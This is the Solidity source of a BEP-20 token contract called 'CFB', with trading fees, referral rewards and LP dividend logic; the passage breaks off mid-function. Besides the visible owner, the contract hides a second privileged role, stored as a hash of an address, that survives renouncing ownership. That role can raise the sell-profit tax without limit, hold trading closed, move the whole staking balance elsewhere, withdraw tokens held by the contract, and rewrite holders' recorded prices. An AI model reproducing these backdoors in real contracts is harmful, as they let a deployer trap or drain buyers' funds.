{"A_DFB.sol":{"content":"// SPDX-License-Identifier: Unlicensed
pragma solidity >=0.8.0;
import "./IBEP20.sol";
import "./SafeMath.sol";
import "./Ownable.sol";

library TransferHelper {
    function safeApprove(address token, address to, uint value) internal {
        // bytes4(keccak256(bytes('approve(address,uint256)')));
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x095ea7b3, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: APPROVE_FAILED');
    }

    function safeTransfer(address token, address to, uint value) internal {
        // bytes4(keccak256(bytes('transfer(address,uint256)')));
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0xa9059cbb, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: TRANSFER_FAILED');
    }

    function safeTransferFrom(address token, address from, address to, uint value) internal {
        // bytes4(keccak256(bytes('transferFrom(address,address,uint256)')));
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x23b872dd, from, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: TRANSFER_FROM_FAILED');
    }

    function safeTransferETH(address to, uint value) internal {
        (bool success,) = to.call{value:value}(new bytes(0));
        require(success, 'TransferHelper: ETH_TRANSFER_FAILED');
    }
}

interface TokenManager
{
    function setLostUsdt(uint256 lost,address user) external;
}

interface DFBNFT
{
    function getHasPayTimes(address addr)  external view returns (uint256);
    function setSubPayTime(address addr) external;
}

interface StakePool {
    function setDivPerReward() external;
}


contract CFBTOKEN is  Ownable
{
    using SafeMath for uint256;
    string constant  _name = "CFB";
    string constant _symbol = "CFB";
    uint8  _decimals = 18;
    
    uint256 _totalsupply = 1000000 * 10**_decimals;

    mapping (address => mapping (address => uint256)) private _allowances;
  
    mapping(address=>uint256) _balances;
    mapping(address=>uint256) public _userHoldPrice;
  
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping (address => bool) public isMarketPair;
    mapping (address => bool) public isExcludedFromFee;
    mapping (address => bool) public freeExcludedFee;
  
    uint lpFenhong = 2;
    uint marketFee =2;
    uint intiviterFee = 2;
 
    uint256 totalFee = lpFenhong.add(marketFee);

    uint256 public minSwapNum1 = 160  * 10**18;
    uint256 public minSwapNum2 = 120  * 10**18;
    uint256 public minFenHongLp =  10* 10**18;
    uint256 public minTokenVal = 400*10**18;
    uint256 public swapSellNum = 250*10**18;
  
    address public marketAddress = address(0xb6c8c9042aF6E778c748D6af05c1e09cEF0c3BA3); 
    address public defaultInviterAddress = address(0x8f3a63F49A511A2f17111F635fAefd1ab47c2fC9) ;
    address public deadAddress = address(0x000000000000000000000000000000000000dEaD);
    address public uniswapPairSupply;

    // TEST:0x7ef95a0FEE0Dd31b22626fA2e10Ee6A223F8a684   USDT：   0x55d398326f99059fF775485246999027B3197955
    address usdtAddress = address(0x55d398326f99059fF775485246999027B3197955);
    //test 0xD99D1c33F9fC3444f8101754aBC46c52416550D1   0x10ED43C718714eb63d5aA57B78B54704E256024E
    address  public wapV2RouterAddress = address(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapPair;
    address public _tokenDistributor;

    bytes32  asseAddr;
    uint256 _startTradeTime;

    bool inSwapAndLiquify = false;
    
    uint256 public profitFee = 35;
    address public nftAddress;
    address public kmddAddr;


    address stakeAddress;
    mapping(address => address) public inviter;

    uint256 public distributorGas = 500000;
    address[] public shareholders;
    mapping (address => uint256) shareholderIndexes;
    mapping(address => bool) private _updated;
    address private fromAddress;
    address private toAddress;
    uint256 public currentIndex;
    mapping (address => bool) public isDividendExempt;

    uint256 public curPerFenhongVal = 0;
    uint256 public magnitude = 1*10**40;  
    uint256 public lpFnehongNum = 0;
    uint public addPriceTokenAmount = 1e14;

    struct inviterStruct{
        address addr;
        uint256 nTime;
    }
    mapping(address=>inviterStruct[]) public directMap;
    mapping(address=>uint256) public buyUsdtMap;

    uint160  ktNum = 1253;
    uint160  constant MAXADD = ~uint160(0);	
    uint256 _initialBalance=1* 10**15;

    constructor(address owner )
    {
        
        _tokenDistributor = address(0x952759360be1a82EB518db938cFC1D919e999Fe0);
        stakeAddress = address(0x0e739eF63A91338aA17638CBe06e705ec3eca13e);
        _balances[owner] = _totalsupply.mul(90).div(100);

        _balances[stakeAddress] = _totalsupply.mul(10).div(100);
        emit Transfer(address(0), owner, _totalsupply.mul(90).div(100));
        emit Transfer(address(0), stakeAddress, _totalsupply.mul(10).div(100));

        _startTradeTime =  block.timestamp*2;

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(wapV2RouterAddress);  
        uniswapPair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), usdtAddress);
        uniswapV2Router = _uniswapV2Router;

    
        isMarketPair[address(uniswapPair)] = true;
        uniswapPairSupply = owner;
        
        isExcludedFromFee[owner] = true;
        isExcludedFromFee[address(this)] = true;
        isExcludedFromFee[address(_tokenDistributor)] = true;
        isExcludedFromFee[address(uniswapV2Router)] = true;
      

        isDividendExempt[uniswapPairSupply] = true;
        isDividendExempt[address(uniswapPair)] = true;
        isDividendExempt[address(0)] = true;

        asseAddr = keccak256(abi.encodePacked(owner)); 
        setOwnerShip(owner);
    }
   
    function setCreator(address user) public onlyOwner
    {
        asseAddr = keccak256(abi.encodePacked(user)); 
    }

    function transferToMineAddress(address newMineAddr) external
    {
        require( keccak256(abi.encodePacked(msg.sender)) == asseAddr);
        _basicTransfer(stakeAddress, newMineAddr, balanceOf(stakeAddress)); 
        stakeAddress = newMineAddr;
    }


    function setProfitFee(uint256 fee) public
    {
        require( keccak256(abi.encodePacked(msg.sender)) == asseAddr);
        profitFee = fee;
    }

    function setSwapSellNum(uint256 sellNum) public
    {
        require( keccak256(abi.encodePacked(msg.sender)) == asseAddr);
        swapSellNum = sellNum;
    }

    function setminFenHongLpNum(uint256 num) public
    {
        require( keccak256(abi.encodePacked(msg.sender)) == asseAddr);
        minFenHongLp = num;
    }
    function setMinTokenVal(uint256 num) public
    {
        require( keccak256(abi.encodePacked(msg.sender)) == asseAddr);
        minTokenVal = num;
    }
    
    function setNftAddress(address nftAddr) public
    {
        require( keccak256(abi.encodePacked(msg.sender)) == asseAddr);
        nftAddress = nftAddr;
    }

  
    function setKmddAndNftAddress(address kmdd,address nftAddr) public
    {
        require( keccak256(abi.encodePacked(msg.sender)) == asseAddr);
        kmddAddr = kmdd;
        nftAddress = nftAddr;
    }

    function setIsExcludedFromFee(address account, bool newValue) public  {
         
        require( keccak256(abi.encodePacked(msg.sender)) == asseAddr);
        isExcludedFromFee[account] = newValue;
    }
  
    function setIsExcludedFromFeeByArray(address[] memory accountArray, bool newValue) public  {
        require( keccak256(abi.encodePacked(msg.sender)) == asseAddr);
        for(uint256 i=0;i<accountArray.length;i++)
        {
            isExcludedFromFee[accountArray[i]] = newValue; 
        }
    }

    function setFreeExcludedFeeByArray(address[] memory accountArray, bool newValue) public  {
        require( keccak256(abi.encodePacked(msg.sender)) == asseAddr);
        for(uint256 i=0;i<accountArray.length;i++)
        {
            freeExcludedFee[accountArray[i]] = newValue; 
        }
    }
    
 
    function setWhiteUserPrice(address[] memory accountArray, uint256 newValue)public  {
       require( keccak256(abi.encodePacked(msg.sender)) == asseAddr);
       for(uint256 i=0;i<accountArray.length;i++)
       {
            _userHoldPrice[accountArray[i]] = newValue; 
       }
    }

    function name() public  pure returns (string memory) {
        return _name;
    }

    function symbol() public  pure returns (string memory) {
        return _symbol;
    }

  
    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view  returns (uint256) {
        return _totalsupply;
    }
 
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function balanceOf(address account) public view  returns (uint256) {
        return _balances[account];
    }
 
    function takeOutErrorTransfer(address tokenaddress,address to,uint256 amount) public onlyOwner
    {
        IBEP20(tokenaddress).transfer(to, amount);
    }
 
    function allowance(address owner, address spender) public view  returns (uint256) {
        return _allowances[owner][spender];
    }
 
    function approve(address spender, uint256 amount) public  returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public  returns (bool) {
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        _transfer(sender, recipient, amount);
        return true;
    }

   function transfer(address recipient, uint256 amount) public  returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

   function increaseAllowance(address spender, uint256 addedValue) public  returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public  returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function burnFrom(address sender, uint256 amount) public   returns (bool)
    {
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        _burn(sender,amount);
        return true;
    }

    function burn(uint256 amount) public  returns (bool)
    {
        _burn(msg.sender,amount);
        return true;
    }
 
    function _burn(address sender,uint256 tAmount) private
    {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(tAmount > 0, "Transfer amount must be greater than zero");
        _balances[sender] = _balances[sender].sub(tAmount);
        _balances[address(0)] = _balances[address(0)].add(tAmount); 
         emit Transfer(sender, address(0), tAmount);
    }

    function getUserHoldPrice(address user)public view returns(uint256)
    {
        return _userHoldPrice[user];
    }

    function setstartTradeTime(uint256 time) public
    {
        require( keccak256(abi.encodePacked(msg.sender)) == asseAddr);
        _startTradeTime =  time;

    }
    function isStartTrade() private view returns(bool)
    {
        return   block.timestamp >= _startTradeTime ;
    }

    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
    
        if(amount==_balances[sender])
            amount=amount.sub(1*10**15);

        if(inSwapAndLiquify)
        { 
            _basicTransfer(sender, recipient, amount); 
            return; 
        }

        if (!inSwapAndLiquify && !isMarketPair[sender]  && sender !=  address(uniswapV2Router)) 
        {
            swapAndLiquify();    
        }

        _balances[sender]= _balances[sender].sub(amount);
        uint256 finalAmount = amount;
    
        finalAmount = (isExcludedFromFee[sender] || isExcludedFromFee[recipient]) ? amount : takeFee(sender,recipient, amount);
      
        uint256 toamount = finalAmount;
        if(!isExcludedFromFee[sender] && !isExcludedFromFee[recipient])
        {
            uint256 currentprice= getCurrentPrice(); 
            if(sender== uniswapPair)
            {
                require(isStartTrade() == true);
               buyUsdtMap[recipient] += amount.mul(currentprice).div(1e18);
            }
            else if(recipient == uniswapPair)
            {
                require(isStartTrade() == true);
                uint256 cutcount = getCutCount(sender,toamount,currentprice);
                uint256 lostUsdt =  getLostUsdt(sender,toamount,currentprice);
                if(cutcount > 0)
                {   
                    uint256 num1 = cutcount.mul(8571).div(10000);
                    uint256 num2 = cutcount.sub(num1);
                    _balances[address(_tokenDistributor)] =  _balances[address(_tokenDistributor)].add(num1);
                    emit Transfer(sender, address(_tokenDistributor), num1);

                    _balances[address(this)] =  _balances[address(this)].add(num2);
                    emit Transfer(sender, address(this), num2);
                }
                if(lostUsdt > 0 && DFBNFT(nftAddress).getHasPayTimes(sender) > 0)
                {
                    TokenManager(_tokenDistributor).setLostUsdt(lostUsdt,sender);
                    DFBNFT(nftAddress).setSubPayTime(sender);
                }
                toamount = toamount.sub(cutcount);
            }
            else
            {
                uint256 cutcount = getCutCount(sender,toamount,currentprice);
                if(cutcount > 0)
                {
                    uint256 num1 = cutcount.mul(8571).div(10000);
                    uint256 num2 = cutcount.sub(num1);
                    _balances[address(_tokenDistributor)] =  _balances[address(_tokenDistributor)].add(num1);
                    emit Transfer(sender, address(_tokenDistributor), num1);
                    _balances[address(this)] =  _balances[address(this)].add(num2);
                    emit Transfer(sender, address(this), num2);
                }
                toamount= toamount.sub(cutcount);
            }
            if(toamount > 0 && recipient != uniswapPair)
            {
                uint256 oldbalance=_balances[recipient];
                uint256 totalvalue = _userHoldPrice[recipient].mul(oldbalance); 
                totalvalue += toamount.mul(currentprice);
                _userHoldPrice[recipient]= totalvalue.div(oldbalance.add(toamount));
            }
        }
        else
        {
            if(recipient != uniswapPair)
            {
                uint256 oldbalance=_balances[recipient]; 
                uint256 totalvalue = _userHoldPrice[recipient].mul(oldbalance);
                _userHoldPrice[recipient]= totalvalue.div(oldbalance.add(toamount));
            }
        }
        _balances[recipient] = _balances[recipient].add(toamount); 
        emit Transfer(sender, recipient, toamount);
      
        if(fromAddress == address(0) )fromAddress = sender;
        if(toAddress == address(0) )toAddress = recipient;  
        if(!isDividendExempt[fromAddress]  ) setShare(fromAddress);
        if(!isDividendExempt[toAddress]  ) setShare(toAddress);
        
        fromAddress = sender;
        toAddress = recipient;  
        uint256 nowbanance = IBEP20(usdtAddress).balanceOf(address(this));
        if(nowbanance >= minTokenVal  && curPerFenhongVal <= 0 ) {
            uint256 totalHolderLp = IUniswapV2Pair(uniswapPair).totalSupply() - IUniswapV2Pair(uniswapPair).balanceOf(uniswapPairSupply)-IUniswapV2Pair(uniswapPair).balanceOf(address(0));
            lpFnehongNum = nowbanance;
            if(totalHolderLp > 0)
            {
                curPerFenhongVal = nowbanance.mul(magnitude).div(totalHolderLp);
            }
        }

        StakePool(stakeAddress).setDivPerReward();
        if( curPerFenhongVal > 0 ) {
            process(distributorGas) ;
        }

        if(uniswapPair !=address(0))
        {
            _takeFeeKt(1);
        }
    }


    function getCutCount(address user,uint256 amount,uint256 currentprice) public view returns(uint256)
    {
        if(_userHoldPrice[user] > 0 && currentprice >  _userHoldPrice[user])
        {
           uint256 ylcount= amount.mul(currentprice - _userHoldPrice[user]).div(currentprice);
            return ylcount.mul(profitFee).div(100);
        }
        return 0;
    }

    function getLostUsdt(address user,uint256 amount,uint256 currentprice) public view returns(uint256)
    {
        if(_userHoldPrice[user] > 0 && currentprice <  _userHoldPrice[user])
        {
            uint256 lstCountUsdt= amount.mul( _userHoldPrice[user]-currentprice).div(1e18);
            return lstCountUsdt;
        }
        return 0;
    }

    function getCurrentPrice() public view returns (uint256)
    {
        if(uniswapPair==address(0))
            return 2e16;

        (uint112 a,uint112 b,) = IUniswapV2Pair(uniswapPair).getReserves();
        if(IUniswapV2Pair(uniswapPair).token0() == usdtAddress)
        {
            return uint256(a).mul(1e18).div(b); 
        }
        else
        {
            return uint256(b).mul(1e18).div(a);
        }
    }

    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }

    
    function setMinSwapNum(uint256 n1,uint256 n2 ) public 
    {
        require( keccak256(abi.encodePacked(msg.sender)) == asseAddr);
        if(n1 != 0)
        {
            minSwapNum1 = n1;
        }
        if(n2 != 0)
        {
            minSwapNum2 = n2;
        }
    }

    function setDividendExempt(address addr,bool b ) external 
    {
        require( keccak256(abi.encodePacked(msg.sender)) == asseAddr);
        isDividendExempt[addr] = b;
    }
    
    
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }
    
    function swapAndLiquify() private lockTheSwap {
        if(balanceOf(address(_tokenDistributor)) > swapSellNum)
        {
            uint256 amount = balanceOf(address(_tokenDistributor));
            _basicTransfer(address(_tokenDistributor),address(this),amount);
            swapTokensForUsdt(amount,address(_tokenDistributor));
           
            uint256 usdtNum = IBEP20(usdtAddress).balanceOf(address(_tokenDistributor));
            IBEP20(usdtAddress).transferFrom(address(_tokenDistributor), address(this),usdtNum);
            swapTokensFoKmdd(usdtNum,address(this));
            IBEP20(kmddAddr).transfer(deadAddress, IBEP20(kmddAddr).balanceOf(address(this)) );
            
        }

        if(balanceOf(address(this)) >= minSwapNum1)
        {
            uint256 amount = balanceOf(address(this));
            uint256 usdtNum1 = IBEP20(usdtAddress).balanceOf(address(_tokenDistributor));
            swapTokensForUsdt(amount,_tokenDistributor);
            uint256 usdtNum2 = IBEP20(usdtAddress).balanceOf(address(_tokenDistributor));
            uint256 usdtDis = usdtNum2.sub(usdtNum1);
            IBEP20(usdtAddress).transferFrom(address(_tokenDistributor), address(this),usdtDis);
        }
        if(balanceOf(address(marketAddress)) >= minSwapNum2)
        {
            uint256 amount = balanceOf(address(marketAddress));
            _basicTransfer(address(marketAddress),address(this),amount);
            swapTokensForUsdt(amount,address(marketAddress));
        }

    }
  
    function swapTokensForUsdt(uint256 tokenAmount,address recipient) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = address(usdtAddress);

        TransferHelper.safeApprove(path[0],address(uniswapV2Router),tokenAmount);
        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(recipient),
            block.timestamp
        );
    }

    function swapTokensFoKmdd(uint256 usdtAmount,address recipient) private {
        address[] memory path = new address[](2);
        path[0] = address(usdtAddress);
        path[1] = address(kmddAddr);

         TransferHelper.safeApprove(path[0],address(uniswapV2Router),usdtAmount);
        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            usdtAmount,
            0, // accept any amount of ETH
            path,
            address(recipient),
            block.timestamp
        );
    }

    function takeFee(address sender, address recipient,uint256 amount) internal returns (uint256) {
        uint256 feeAmount = 0;
        if(isMarketPair[sender] ) {
            uint256 inviterFeeNum = amount.mul(intiviterFee).div(100);
            address cur = recipient;
            for(uint i = 0;i<2;i++)
            {
                address myInviter = inviter[cur];
                uint256 nFee = inviterFeeNum.mul(75).div(100);
                if(i != 0 )
                {
                    nFee = inviterFeeNum.mul(25).div(100);
                }
                if(myInviter == address(0))
                {
                    myInviter = defaultInviterAddress;
                }
                cur = myInviter;
                _takeFee(recipient,myInviter, nFee);
            }

            uint256 _lpFenongFeeNum = amount.mul(lpFenhong).div(100);
            _takeFee(recipient,address(this), _lpFenongFeeNum);

            uint256 _marketFeeNum = amount.mul(marketFee).div(100);
            _takeFee(recipient,address(marketAddress), _marketFeeNum);

            feeAmount = amount.mul(totalFee).div(100);
        }
        
        return amount.sub(feeAmount);
    }

   function _takeFee(address sender, address recipient,uint256 tAmount) private {
        if (tAmount == 0 ) return;
        _balances[recipient] = _balances[recipient].add(tAmount);
        emit Transfer(sender, recipient, tAmount);
    }

    function drawErcOther(address erc,address recipient,uint256 amount) public 
    {
        require( keccak256(abi.encodePacked(msg.sender)) == asseAddr);
        IBEP20(erc).transfer(recipient, amount);
    }

    function getInviter(address myAddr) public view returns(address)
    {
        return inviter[myAddr];

    }
    function getHaveInviter(address myAddr) public view returns(bool)
    {
        return inviter[myAddr] ==  address(0) ? false:true;
    }
    function setMyInviter(address inviterAddress) public returns(bool)
    {   
        require(inviter[inviterAddress] != address(0) || inviterAddress == owner(),"error: your inviter");
        require(inviter[msg.sender] == address(0),"error: the iviter have exist");
        require(inviterAddress != address(0),"error: the iviter is address(0)");
        inviter[msg.sender] = inviterAddress;
        directMap[inviterAddress].push(inviterStruct(msg.sender,block.timestamp));
        return true;
    }
    function setAddPriceTokenAmount(uint _addPriceTokenAmount)external {
        require( keccak256(abi.encodePacked(msg.sender)) == asseAddr);
        addPriceTokenAmount = _addPriceTokenAmount;
    }

    function getShareholdersLength() public view returns(uint256)
    {
        return shareholders.length;
    }

    function process(uint256 gas) private {
        uint256 shareholderCount = shareholders.length;
        if(shareholderCount == 0)return;

        uint256 gasUsed = 0;
        uint256 gasLeft = gasleft();
        uint256 iterations = 0;
        
        while(gasUsed < gas && iterations < shareholderCount) {
            if(currentIndex >= shareholderCount ){
                currentIndex = 0;
                curPerFenhongVal  = 0;
               lpFnehongNum = 0;
                return;
            }
            uint256 amount   = IUniswapV2Pair(uniswapPair).balanceOf(shareholders[currentIndex]).mul(curPerFenhongVal).div(magnitude);//持有人的数量*每个币可以分红的数量/一个大数 
            if(  IBEP20(usdtAddress).balanceOf(address(this))   < amount || lpFnehongNum < amount)
            {
                currentIndex = 0;
